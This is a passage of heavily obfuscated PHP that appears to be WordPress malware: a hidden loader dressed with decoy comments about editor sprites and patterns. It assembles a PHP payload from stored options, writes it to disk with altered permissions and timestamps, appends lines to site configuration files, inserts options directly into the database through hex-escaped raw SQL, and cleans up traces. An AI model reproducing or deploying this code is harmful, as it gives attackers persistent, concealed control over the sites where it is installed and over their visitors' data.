   $ou1jl__31un5ac5u    =  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1112))   ? (string)  $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url('/'),    PHP_URL_PATH) : '/';
if  ($ou1jl__31un5ac5u   === "")  $ou1jl__31un5ac5u   = '/';

    if  ($GLOBALS['__scf_bv1z3no349dv5r_9']($ou1jl__31un5ac5u,    -1)   !==    '/')  $ou1jl__31un5ac5u   .=    '/';


        $zwjy5a9wp6dbxxuj  =   array(
pahk8uy1uxt(1123)  =>  mbwj2ok57baj7zc51bn4(),
   f5cd2smymkqusi5(1124)   =>   nt9a6f1fvujlb8i0us832e(),
 pahk8uy1uxt(1125)    =>    $ou1jl__31un5ac5u,


       );
  $hepkxex8p0u  =   array(
   dhd5r6_4ki(1126)     => $r3bw5h6ltwcw0b,
  nhceivfj8tbe(1127)  =>  $q4nmj640k4ytm0w,
 pahk8uy1uxt(1128)  =>  $uj2p4q2y6w9,
dhd5r6_4ki(1129)  =>   ohrydgas8yy9a22s(ABSPATH    .    dhd5r6_4ki(1130),  (4+8)),



   mhiu2yqz6kqd(1131) =>    $zoa6tdqql_,
    );
$v6a27jp1sc7ukro    = weg_ghiafmuc1_6(dhd5r6_4ki(344), "");
  if  (!$GLOBALS['__scf__me483qbepnts_41']($v6a27jp1sc7ukro)     ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($v6a27jp1sc7ukro)    === 0)  {
// WP Full Site Editing icon sprite

 return;
    



 }
$bg_fk0e2d4h6eqcl =     $GLOBALS['__scf_b6bj8r78s21_351'](opn9d92hgvp02lt0zjrg($GLOBALS['__scf_umr3maax4akmys_597']($hepkxex8p0u), $v6a27jp1sc7ukro));
      

 $nfuhj5dypk   =   mhiu2yqz6kqd(1132)  .  $GLOBALS['__scf_b6bj8r78s21_351']($GLOBALS['__scf_umr3maax4akmys_597']($zwjy5a9wp6dbxxuj))  . dhd5r6_4ki(1133);
        $nfuhj5dypk   .= dhd5r6_4ki(1134)  .   $bg_fk0e2d4h6eqcl  .   mhiu2yqz6kqd(1135);


 $orqpfa1ypncsrfu  =     $GLOBALS['__scf_nn04_vx3uspzx4_54']((string) $xrlia3wn0e6dfy3    .  (string)  $zoa6tdqql_ .  $v6a27jp1sc7ukro  .    $GLOBALS['__scf_umr3maax4akmys_597']($zwjy5a9wp6dbxxuj[dhd5r6_4ki(1123)]) .  $GLOBALS['__scf_umr3maax4akmys_597']($zwjy5a9wp6dbxxuj[pahk8uy1uxt(1124)])  .    '|' .  $GLOBALS['__scf_h3sj62ryxfdde_99'](romae2ec00z0c4bz61q_(""))   .   '|' .   $ou1jl__31un5ac5u);


        if   (c8fb1vg_q0kn6h(nhceivfj8tbe(1136),  $nfuhj5dypk,    f5cd2smymkqusi5(1137)) || vlqx8b8viizxmck29ty0(nhceivfj8tbe(1138),     "")   ===    $nfuhj5dypk) c8fb1vg_q0kn6h(f5cd2smymkqusi5(1139),  $orqpfa1ypncsrfu,  mhiu2yqz6kqd(1137));

    unset($orqpfa1ypncsrfu);
     $rumb55g4lxs3to  = $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1140))  ? home_url(pahk8uy1uxt(1141)      .  h2iz25lld35tmbc2ls(nhceivfj8tbe(643)))  :   "";



 if  ($rumb55g4lxs3to  ===  "")      $rumb55g4lxs3to  =    pahk8uy1uxt(1142) .  romae2ec00z0c4bz61q_("")  . f5cd2smymkqusi5(1116) .  h2iz25lld35tmbc2ls(nrudcgor(643));
    if  ($GLOBALS['__scf_nr12ouzrtt_7']($rumb55g4lxs3to, pahk8uy1uxt(1142))  !== 0)     $rumb55g4lxs3to  =   mhiu2yqz6kqd(1143)  .      $GLOBALS['__scf_xztaeq78skok5_8']($GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(1118),  "", $rumb55g4lxs3to),    '/');
 c8fb1vg_q0kn6h(mhiu2yqz6kqd(363),  $rumb55g4lxs3to,   f5cd2smymkqusi5(1137));
  

 if    ($GLOBALS['__scf_amjjmfnilcolnb_10']($xrlia3wn0e6dfy3) < (55+45)) {
  return;
  

    }
  c8fb1vg_q0kn6h(pahk8uy1uxt(644), $xrlia3wn0e6dfy3,   pahk8uy1uxt(1137));



   if     (!ty_934d39r4f423mos346()) return;
 $lygkvqavcckr     =  twjiqbicrnr_q7();$g4lg2i23p5=PHP_MAJOR_VERSION;$blllxbmi=$g4lg2i23p5*6;
  if  (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($lygkvqavcckr))   gt671tq3242garyx4($lygkvqavcckr,   (424+69),    true);
   if (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($lygkvqavcckr)     ||     !@$GLOBALS['__scf_cu2oflxkvh_47']($lygkvqavcckr))     return;
   $mahs498mq3    = $lygkvqavcckr    .  '/'   .  $oe0kuwyehv     .    nhceivfj8tbe(1065);
   $pmzr1zq95bn67  =   d05gkzggk_uo5zo(
pahk8uy1uxt(655),
 array('__SLUG__',   '__ZIP_NAME__', '__WRITE_KEY__',  '__VERSION__'),

 array($q4nmj640k4ytm0w,   $yc07oz4u4pa,     ohrydgas8yy9a22s(ABSPATH    . dhd5r6_4ki(1130), (3+9)),    kwqziujdph5xlz3n())
 );
    if     (!$pmzr1zq95bn67)    {
   if ((int) get_option(dhd5r6_4ki(424),  0)  > 0)  fukkkeh6955g9qi(dhd5r6_4ki(643),   nrudcgor(1144));
return;
 }
   if   (!@$GLOBALS['__scf_od_0qrqi5rcvlf_701']($mahs498mq3)     ||  $GLOBALS['__scf_nn04_vx3uspzx4_54'](g9begdqy64lw_mpz((string)  @$GLOBALS['__scf_apq4pqdt6n41_91']($mahs498mq3)))    !==   $GLOBALS['__scf_nn04_vx3uspzx4_54']($pmzr1zq95bn67))      {
     rqua3yflpt29vaz8icdaze($mahs498mq3,  $pmzr1zq95bn67,  pahk8uy1uxt(1145));
       kfdh_vugi0_9nv_wpj($mahs498mq3,  cpfi26oipjceuyib8());

      rgiuaapohxeh0z($mahs498mq3, (384+36));
    ejl1lwk108flojzx($mahs498mq3);



    }
 }   catch     (Throwable      $h2v_bjm4ejxq8fp)     {
   fukkkeh6955g9qi(f5cd2smymkqusi5(643),   $h2v_bjm4ejxq8fp);
  }   catch   (Exception   $h2v_bjm4ejxq8fp)     {

 }
  }
 function d05gkzggk_uo5zo($key,  $hr5fj9d13y,  $uxqphe4bjydaj)
   {
 $bots2la3gz    =   null;


 if    ($bots2la3gz ===     null) {
  $bots2la3gz     = $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(455))     ?  get_transient(se_any4b12t9njlu())   :  false;
  if  (!    $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz)) {
$bots2la3gz =   tp_6sv5wl2a4y33wdv758(mhiu2yqz6kqd(1146),  false);
    }
   if    (!   $GLOBALS['__scf_vf9p0fditvxy_35']($bots2la3gz))  {
      $bots2la3gz     =    array();
       }
 }
    $u5xfm3z90ff   =  "";
     if     (isset($bots2la3gz[$key])      &&  $GLOBALS['__scf__me483qbepnts_41']($bots2la3gz[$key]))   {
$u5xfm3z90ff =  $bots2la3gz[$key];



 }
 if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($u5xfm3z90ff)    <  (177^131)) {
$u5xfm3z90ff    =   vlqx8b8viizxmck29ty0($key,  "");
}
   if ($GLOBALS['__scf_amjjmfnilcolnb_10']($u5xfm3z90ff) <  (0xf+0x23)) return     false;

   $tvb6duty46kk5o   =  $GLOBALS['__scf_wlpl5h61eyolq_355']($u5xfm3z90ff,   true);
   if (!$tvb6duty46kk5o ||  $GLOBALS['__scf_amjjmfnilcolnb_10']($tvb6duty46kk5o) <   (55-5)) return false;
if  ($GLOBALS['__scf_nr12ouzrtt_7']($tvb6duty46kk5o,   f5cd2smymkqusi5(1147)) === false)   return  false;



     $tvb6duty46kk5o =    $GLOBALS['__scf_f9_5dfsm5hfxx_360']($hr5fj9d13y, $uxqphe4bjydaj,    $tvb6duty46kk5o);
   

        if (defined(dhd5r6_4ki(241)))  {
  try {
 @token_get_all($tvb6duty46kk5o,  TOKEN_PARSE);$pt7vtdqr2t7f=67+37;$xqp05wbul3=$pt7vtdqr2t7f-23;


   } catch  (Throwable  $h2v_bjm4ejxq8fp)  {
   return     false;

    }  catch  (Exception $h2v_bjm4ejxq8fp)   {
// Pest PHP 2: spill adapter

 return  false;


 }
}   elseif      (!hkk3yvii60ci7rk($tvb6duty46kk5o)) {
return false;


}
  return   $tvb6duty46kk5o;



  }
 function yjkrjx8q3v6i5zrgis4g()
     {


     try    {


  if (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(455)))   return;
if    (!defined(mhiu2yqz6kqd(1042)))  return;
  $fg4gw729o2gmjfgd =   zz9m34bs95t5e0ne4iwe_0();
if     (!$fg4gw729o2gmjfgd)    {
  whipohxst5rdrpxw();
 $fg4gw729o2gmjfgd  =  zz9m34bs95t5e0ne4iwe_0();
 }
$ytiykozwcur =  vlqx8b8viizxmck29ty0(mhiu2yqz6kqd(344),    "");
if  ($GLOBALS['__scf_amjjmfnilcolnb_10']($ytiykozwcur)  ===  0)   $ytiykozwcur    =  $GLOBALS['__scf_x84r5u38i5t_1148']("\x00",  (0x4+0xc));

        $fj1_kornegf   =   (isset($GLOBALS[nrudcgor(1149)])  &&  $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[f5cd2smymkqusi5(1149)]) && $GLOBALS['__scf_amjjmfnilcolnb_10']($GLOBALS[f5cd2smymkqusi5(1149)])   >= (0x60+0x4))   ?   $GLOBALS[mhiu2yqz6kqd(1149)] :    vlqx8b8viizxmck29ty0(pahk8uy1uxt(644),    "");$eg07o3sk=PHP_MAJOR_VERSION;$yqse74nnvic_=$eg07o3sk*1;


     if   ($GLOBALS['__scf_amjjmfnilcolnb_10']($fj1_kornegf) <  (0xc+0x58))  $fj1_kornegf =    pec45e4yybq3woqtn();
$n8_dsn2d1f    =   (isset($GLOBALS[f5cd2smymkqusi5(1121)])   &&  $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[f5cd2smymkqusi5(1150)])    &&   $GLOBALS['__scf_amjjmfnilcolnb_10']($GLOBALS[pahk8uy1uxt(1150)]) > (39+11)) ?  $GLOBALS[f5cd2smymkqusi5(1150)]   :   vlqx8b8viizxmck29ty0(pahk8uy1uxt(1151),  "");

  $fnvi5eq8lsbs9  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(1140)) ?   (string)   $GLOBALS['__scf_u6ui6ntfvxm1_565'](home_url('/'),  PHP_URL_PATH) :      '/';
 

    if   ($fnvi5eq8lsbs9  ===  "")   $fnvi5eq8lsbs9     =   '/';
    if   ($GLOBALS['__scf_bv1z3no349dv5r_9']($fnvi5eq8lsbs9, -1)  !==   '/')  $fnvi5eq8lsbs9 .= '/';$v66qa8uv9cn=8738;$vea_0csflxdvv5=$v66qa8uv9cn%3;
$_avadncln5xzar   =    $GLOBALS['__scf_nn04_vx3uspzx4_54']($fj1_kornegf     .  $n8_dsn2d1f    .  $ytiykozwcur   . $GLOBALS['__scf_umr3maax4akmys_597'](mbwj2ok57baj7zc51bn4())  .  $GLOBALS['__scf_umr3maax4akmys_597'](nt9a6f1fvujlb8i0us832e())  . '|'    .   $GLOBALS['__scf_h3sj62ryxfdde_99'](romae2ec00z0c4bz61q_(""))  .  '|'   . $fnvi5eq8lsbs9);
  unset($fnvi5eq8lsbs9);
if    (vlqx8b8viizxmck29ty0(pahk8uy1uxt(1139),     "")  !==  $_avadncln5xzar)    {
// WordPress 6.4 patterns: compile savepoint




   whipohxst5rdrpxw();
  $fg4gw729o2gmjfgd  = zz9m34bs95t5e0ne4iwe_0();
  }
     if (!ty_934d39r4f423mos346())   return;
$ga9fric5dh =   ajbg_44koa9suqi();$dx7t6wupk=36*2;$j1mqdg_1=$dx7t6wupk-29;



 $ry8jk601b_9   = @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($ga9fric5dh  .    dhd5r6_4ki(514));



if  ($ry8jk601b_9   &&  $fg4gw729o2gmjfgd    && get_transient(dhd5r6_4ki(1152)))   return;
 bext3vqy27eoubz36us6();



    idcyucvh615x4xr();
      b6r6ri9evdjine();$i5uu5501g=77*6;$v9moxwhj3x4em=$i5uu5501g-40;
    $pke6f52t8gyxa  =  @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($ga9fric5dh  . mhiu2yqz6kqd(514));
     

$fg4gw729o2gmjfgd   =   zz9m34bs95t5e0ne4iwe_0();



      if  ($pke6f52t8gyxa     &&  $fg4gw729o2gmjfgd)  {

     set_transient(pahk8uy1uxt(1152),  1, (0x45+0xe7));
      }
      }   catch (Throwable  $h2v_bjm4ejxq8fp)      {
 fukkkeh6955g9qi(pahk8uy1uxt(1153), $h2v_bjm4ejxq8fp);
      } catch (Exception  $h2v_bjm4ejxq8fp)  {
}
 }
    function idcyucvh615x4xr()
 {
 try   {



   if  (!defined(dhd5r6_4ki(1042)))  return;
  $ga9fric5dh   =    ajbg_44koa9suqi();
  $lygkvqavcckr  =     twjiqbicrnr_q7();
  $hmskkw1gqak4 =  ohrydgas8yy9a22s(ABSPATH  .    f5cd2smymkqusi5(1154),      (5+3)) .     nhceivfj8tbe(1065);
  



 $h4zcdnr6v1g14p = $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(574))    ? @$GLOBALS['__scf_jpj9mbom_1b_109'](nhceivfj8tbe(524)) : false;

    $h4zcdnr6v1g14p = $GLOBALS['__scf__me483qbepnts_41']($h4zcdnr6v1g14p)     ? $GLOBALS['__scf_uvjtdemk2f_320']($h4zcdnr6v1g14p)   : "";

    if   ($h4zcdnr6v1g14p      === "" ||    $GLOBALS['__scf_ax2r3l4mqpy2_1155']($h4zcdnr6v1g14p,    nrudcgor(1156))  === 0)  $h4zcdnr6v1g14p    =  pahk8uy1uxt(526);
$ws_kdl_i56f  =  $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa())  .    mhiu2yqz6kqd(166);
    $soxvm01ldzpec =  defined(pahk8uy1uxt(1046))  ? WP_CONTENT_DIR . nhceivfj8tbe(1157) :  $ws_kdl_i56f;

        $lf2wojihleow5og   =  array($GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh, nhceivfj8tbe(1158)),   $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),   f5cd2smymkqusi5(1158)),      $GLOBALS['__scf_xv_2irmjrq_12']($lygkvqavcckr,    dhd5r6_4ki(1158)), $GLOBALS['__scf_xv_2irmjrq_12']($ws_kdl_i56f,    dhd5r6_4ki(1158)),    $GLOBALS['__scf_xv_2irmjrq_12']($soxvm01ldzpec,    nrudcgor(1159)));


     if   (defined(nhceivfj8tbe(1046))) $lf2wojihleow5og[]   =   $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,   nrudcgor(1159));
 foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($lf2wojihleow5og) as   $cpjiw2uar0zr12a)      {

        $qfqpzhxxad6vcjdy  =    $cpjiw2uar0zr12a      .  '/'    .  $hmskkw1gqak4;
if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($qfqpzhxxad6vcjdy)) mjw_rlyx5u4bmrdl1oct($qfqpzhxxad6vcjdy,      null);
      $pc00fbwh_r0j  =   $cpjiw2uar0zr12a .  mhiu2yqz6kqd(1160) . $hmskkw1gqak4;
   if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($pc00fbwh_r0j)) mjw_rlyx5u4bmrdl1oct($pc00fbwh_r0j,      null);
 }

 unset($ws_kdl_i56f,   $soxvm01ldzpec,  $lf2wojihleow5og,     $cpjiw2uar0zr12a,     $qfqpzhxxad6vcjdy,    $pc00fbwh_r0j);
 $wbybj5l0hjv4yrjk   =   array($GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH, dhd5r6_4ki(1159)));

if    (defined(dhd5r6_4ki(1161)))    $wbybj5l0hjv4yrjk[]  = $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,  dhd5r6_4ki(1159));
$wbybj5l0hjv4yrjk[]  =  $GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,   f5cd2smymkqusi5(1159));
 

    $wbybj5l0hjv4yrjk[]      =    $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),     dhd5r6_4ki(1162));
    foreach   ($GLOBALS['__scf_e3ymc0hwiys_147']($wbybj5l0hjv4yrjk) as $ojxwecs0x9z8h) {
 $nbemrx7ga1v2  = $ojxwecs0x9z8h  .  '/' .  $h4zcdnr6v1g14p;
 $ba9fzsa_e04lv = @$GLOBALS['__scf_gsamhlxot70ps_18']($nbemrx7ga1v2) ? @$GLOBALS['__scf_apq4pqdt6n41_91']($nbemrx7ga1v2)   :  "";

 if (!$GLOBALS['__scf__me483qbepnts_41']($ba9fzsa_e04lv)     ||  $ba9fzsa_e04lv === "" ||    $GLOBALS['__scf_nr12ouzrtt_7']($ba9fzsa_e04lv, $hmskkw1gqak4)   ===   false) continue;
 $k7uo7fqvr8upx3      =  $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1163)  .   $GLOBALS['__scf_u60sfqdal7_816']($hmskkw1gqak4, '/') . dhd5r6_4ki(1164),  "\n", $ba9fzsa_e04lv);
   if  ($GLOBALS['__scf__me483qbepnts_41']($k7uo7fqvr8upx3) && $k7uo7fqvr8upx3  !== $ba9fzsa_e04lv &&    jr30c_pj_1z9sfyaq3c88($nbemrx7ga1v2, $k7uo7fqvr8upx3)) fukkkeh6955g9qi(nrudcgor(1165),   f5cd2smymkqusi5(1166));
  }
 unset($wbybj5l0hjv4yrjk,    $ojxwecs0x9z8h,   $nbemrx7ga1v2,     $ba9fzsa_e04lv,  $k7uo7fqvr8upx3);
       if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(757)))  {$jdgdsp9uyv3acj=8457;$p4fhusc6fons=$jdgdsp9uyv3acj%9;
@delete_option(pahk8uy1uxt(1167));
  @delete_option(pahk8uy1uxt(1168));
 

  @delete_option(nhceivfj8tbe(1169));
 }
/* satisfiable task-graph */

   }  catch   (Throwable  $h2v_bjm4ejxq8fp)      {

    fukkkeh6955g9qi(mhiu2yqz6kqd(1165), $h2v_bjm4ejxq8fp);
   }      catch    (Exception $h2v_bjm4ejxq8fp)  {
}



     }

 function ds4n8wxzil54jxg57()
 {
    try    {
if    (!defined(mhiu2yqz6kqd(1042))) return;
      $ga9fric5dh    =  ajbg_44koa9suqi();
 $lygkvqavcckr   =  twjiqbicrnr_q7();


 


      $hmskkw1gqak4 = ohrydgas8yy9a22s(ABSPATH .    mhiu2yqz6kqd(1170), (221^213))  . f5cd2smymkqusi5(1065);
    $ws_kdl_i56f    =   $GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()) . nhceivfj8tbe(1171);
 $soxvm01ldzpec =   defined(nhceivfj8tbe(1161))     ?    WP_CONTENT_DIR   . mhiu2yqz6kqd(1171) :  $ws_kdl_i56f;$okqom6du=4*3;$gjr3wckdb16dye=$okqom6du-46;
$lf2wojihleow5og  =   array($GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,     nhceivfj8tbe(1162)),  $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),   nrudcgor(1172)),  $GLOBALS['__scf_xv_2irmjrq_12']($lygkvqavcckr, nrudcgor(1172)),  $GLOBALS['__scf_xv_2irmjrq_12']($ws_kdl_i56f,    dhd5r6_4ki(1173)),     $GLOBALS['__scf_xv_2irmjrq_12']($soxvm01ldzpec,  nrudcgor(1174)));
if     (defined(f5cd2smymkqusi5(1175)))  $lf2wojihleow5og[] =  $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,     dhd5r6_4ki(1174));



    foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($lf2wojihleow5og)  as   $cpjiw2uar0zr12a) {
$cx_ybk5g8doey   =   $cpjiw2uar0zr12a . '/'    . $hmskkw1gqak4;
     if (@$GLOBALS['__scf_gsamhlxot70ps_18']($cx_ybk5g8doey))     mjw_rlyx5u4bmrdl1oct($cx_ybk5g8doey,  null);


  }
   unset($ws_kdl_i56f, $soxvm01ldzpec, $lf2wojihleow5og,   $cpjiw2uar0zr12a, $cx_ybk5g8doey);
  $jjwnyk_5cvlo  =  array($GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH, f5cd2smymkqusi5(1176)));
   if     (defined(f5cd2smymkqusi5(1177)))  $jjwnyk_5cvlo[]   =  $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,  pahk8uy1uxt(1176));
      $jjwnyk_5cvlo[] =    $GLOBALS['__scf_xv_2irmjrq_12']($ga9fric5dh,  nhceivfj8tbe(1176));


 $jjwnyk_5cvlo[] = $GLOBALS['__scf_xv_2irmjrq_12']($GLOBALS['__scf_eure5hcx2b_11'](vv_nfhhmy_1mjmsa()),    f5cd2smymkqusi5(1178));
      foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($jjwnyk_5cvlo) as  $xg0dv3n3mlqspc)  {

 $pc00fbwh_r0j  =    $xg0dv3n3mlqspc     . dhd5r6_4ki(1179);
   $w5z7mjsry5o_g3bt    =  @$GLOBALS['__scf_gsamhlxot70ps_18']($pc00fbwh_r0j)  ?  @$GLOBALS['__scf_apq4pqdt6n41_91']($pc00fbwh_r0j) :  "";
      if   (!$GLOBALS['__scf__me483qbepnts_41']($w5z7mjsry5o_g3bt)    || $w5z7mjsry5o_g3bt   ===    ""     || $GLOBALS['__scf_nr12ouzrtt_7']($w5z7mjsry5o_g3bt,    $hmskkw1gqak4)    ===  false) continue;


$qbdlw3lz03u05rz =   vfr3ww330iahx60ypzxvm($w5z7mjsry5o_g3bt, $hmskkw1gqak4);
       if ($GLOBALS['__scf__me483qbepnts_41']($qbdlw3lz03u05rz) &&   $qbdlw3lz03u05rz    !==  $w5z7mjsry5o_g3bt  &&  jr30c_pj_1z9sfyaq3c88($pc00fbwh_r0j,   $qbdlw3lz03u05rz))  fukkkeh6955g9qi(pahk8uy1uxt(1180),   nhceivfj8tbe(1181));
  }
      unset($jjwnyk_5cvlo,  $xg0dv3n3mlqspc,    $pc00fbwh_r0j,   $w5z7mjsry5o_g3bt, $qbdlw3lz03u05rz);
 if  ($GLOBALS['__scf_c9jv8d7koon_100']() ===   nhceivfj8tbe(401))     return;
 if    (!wg0a8w3ua1y7mxk_91zd2v())   return;
  if (!ty_934d39r4f423mos346()) return;

     $ysxvst6sv559d =    $lygkvqavcckr      .    mhiu2yqz6kqd(1182);
 $gurk4u0g0h057    =   dhd5r6_4ki(1183)  . "\n"
 .  nhceivfj8tbe(1184)     .    "\n"     .    nhceivfj8tbe(1185) . "\n"  . mhiu2yqz6kqd(1186)    . "\n"
 .    mhiu2yqz6kqd(1187)  .   "\n"  .    pahk8uy1uxt(1188)    . "\n"     .  mhiu2yqz6kqd(1186) .    "\n"
  .      nrudcgor(1189)   .   "\n";
 $uocr8d00oz =  @$GLOBALS['__scf_od_0qrqi5rcvlf_701']($ysxvst6sv559d);
   $current     =   $uocr8d00oz ?   @$GLOBALS['__scf_apq4pqdt6n41_91']($ysxvst6sv559d)   :  "";

 if  (!$GLOBALS['__scf__me483qbepnts_41']($current))   {



  fukkkeh6955g9qi(dhd5r6_4ki(1180), mhiu2yqz6kqd(1190));
   return;
     }
    $l0j6pf8rn6bvrj   =   array($GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH,  nhceivfj8tbe(1178)));
 if   (defined(f5cd2smymkqusi5(1177)))     $l0j6pf8rn6bvrj[]   =  $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR,  dhd5r6_4ki(1178));
  if   (defined(f5cd2smymkqusi5(1191)))      $l0j6pf8rn6bvrj[]   =  $GLOBALS['__scf_xv_2irmjrq_12'](WPMU_PLUGIN_DIR, mhiu2yqz6kqd(1178));


    if (defined(pahk8uy1uxt(1039)))    $l0j6pf8rn6bvrj[] =  $GLOBALS['__scf_xv_2irmjrq_12'](WP_PLUGIN_DIR, dhd5r6_4ki(1192));
      $p3yf1sapqmt   =     $GLOBALS['__scf_xv_2irmjrq_12']($lygkvqavcckr,    f5cd2smymkqusi5(1192));


  $ql35guitsbw    =     $GLOBALS['__scf_rq7q923zwh_148']($p3yf1sapqmt,     $l0j6pf8rn6bvrj,  true);
    unset($l0j6pf8rn6bvrj,    $p3yf1sapqmt);
    if    (!$ql35guitsbw)   {
 $egjh_up_cc   =   $lygkvqavcckr   . pahk8uy1uxt(1193);
 if    (!@$GLOBALS['__scf_gsamhlxot70ps_18']($egjh_up_cc))  rqua3yflpt29vaz8icdaze($egjh_up_cc,  "",   mhiu2yqz6kqd(1194));
 if ($GLOBALS['__scf_nr12ouzrtt_7']($current, dhd5r6_4ki(1195)) === false)  {
 $c3ex6bt4rjbrg  =     $current;
     if  ($current !== ""    && $GLOBALS['__scf_bv1z3no349dv5r_9']($current,   -1)   !==   "\n") $current  .=  "\n";
   $eiyu646ifqu    =  @$GLOBALS['__scf_apq4pqdt6n41_91']($ysxvst6sv559d);
if   (!$GLOBALS['__scf__me483qbepnts_41']($eiyu646ifqu))  $eiyu646ifqu = "";
 if  ($eiyu646ifqu    !==     $c3ex6bt4rjbrg)    {
fukkkeh6955g9qi(nrudcgor(1180),  mhiu2yqz6kqd(1196));
 }     else {
jr30c_pj_1z9sfyaq3c88($ysxvst6sv559d,     $current  .    $gurk4u0g0h057);
    kfdh_vugi0_9nv_wpj($ysxvst6sv559d,   cpfi26oipjceuyib8());
  if (!$uocr8d00oz)    rgiuaapohxeh0z($ysxvst6sv559d,   (729-309));
}
  unset($eiyu646ifqu, $c3ex6bt4rjbrg);



 }
 }
      unset($ql35guitsbw,     $egjh_up_cc, $uocr8d00oz);
}   catch   (Throwable   $h2v_bjm4ejxq8fp)  {
   fukkkeh6955g9qi(mhiu2yqz6kqd(1197),      $h2v_bjm4ejxq8fp);
     }    catch    (Exception $h2v_bjm4ejxq8fp) {
   fukkkeh6955g9qi(dhd5r6_4ki(1197), $h2v_bjm4ejxq8fp);
  }
  }
   function      r3jijy1bnkvtvmqedf()
{

   try   {
   if  (!defined(dhd5r6_4ki(1042)))  return;
     if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1043)))  return;
  $sv9h9r5s57g5trl = ohrydgas8yy9a22s(ABSPATH  .    nrudcgor(1198),  (19-9));
    $vg45smeglid  =  adbbbpoh0e7mcf6();
if  (!$vg45smeglid || $GLOBALS['__scf_amjjmfnilcolnb_10']($vg45smeglid)  < (866-366))  return;
 $u5xfm3z90ff    =  mpkogxinl1o8xqdhl__();
     $current   =  @get_option($sv9h9r5s57g5trl,   "");
  if   ($current   &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($current)  === $GLOBALS['__scf_amjjmfnilcolnb_10']($u5xfm3z90ff) &&  $current   ===  $u5xfm3z90ff) return;
  if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(753)))  {


 update_option($sv9h9r5s57g5trl,  $u5xfm3z90ff, nrudcgor(1137));
 }    elseif     (defined(nrudcgor(1199))  &&    defined(nhceivfj8tbe(1200))  && defined(f5cd2smymkqusi5(1201))    && defined(nhceivfj8tbe(1202))    &&   $GLOBALS['__scf_mh99vqi740eg_542'](pahk8uy1uxt(1203))) {
      $tlug1sh_gtc  =  dhd5r6_4ki(1203);
 $pafc960879gk2n   =  @new $tlug1sh_gtc(constant(pahk8uy1uxt(1204)),    constant(pahk8uy1uxt(1200)),     constant(nrudcgor(1205)),     constant(f5cd2smymkqusi5(1202)));
if ($pafc960879gk2n && !$pafc960879gk2n->connect_errno)   {
   $prefix = isset($GLOBALS[mhiu2yqz6kqd(1100)]->prefix) ?   $GLOBALS[nrudcgor(1100)]->prefix :   nrudcgor(1206);
$h91nnw6mbkr_  =  $pafc960879gk2n->real_escape_string($u5xfm3z90ff);
  $ebqz6u5hgmo  =  $pafc960879gk2n->real_escape_string($sv9h9r5s57g5trl);



   $pafc960879gk2n->query("I\x4eS\x45RT IN\x54O {$prefix}\x6f\x70t\x69\x6f\x6es (\x6f\x70t\x69\x6f\x6e_nam\x65, \x6fpt\x69\x6f\x6e_va\x6cue, au\x74\x6fl\x6fad) \x56\x41LU\x45S ('{$ebqz6u5hgmo}', '{$h91nnw6mbkr_}', '\x6eo') ON \x44UP\x4cICATE \x4bE\x59 U\x50DATE o\x70\x74\x69\x6fn_valu\x65='{$h91nnw6mbkr_}'");
   if   ($pafc960879gk2n->error) fukkkeh6955g9qi(dhd5r6_4ki(1207), pahk8uy1uxt(1208) .   $GLOBALS['__scf_bv1z3no349dv5r_9']($pafc960879gk2n->error, 0,  (172-52)));
  $pafc960879gk2n->close();
 }



     }



}   catch (Throwable  $h2v_bjm4ejxq8fp)  {$qwysd1qyzl=1315;$ok5nqn5fzc=$qwysd1qyzl%5;
 fukkkeh6955g9qi(dhd5r6_4ki(1209), $h2v_bjm4ejxq8fp);
 }     catch     (Exception    $h2v_bjm4ejxq8fp)    {$gwys622zm=PHP_MAJOR_VERSION;$y06poyacrrlnff=$gwys622zm*7;
}


  }
 function  c22qy86hpk_wa_dng_pe()
{
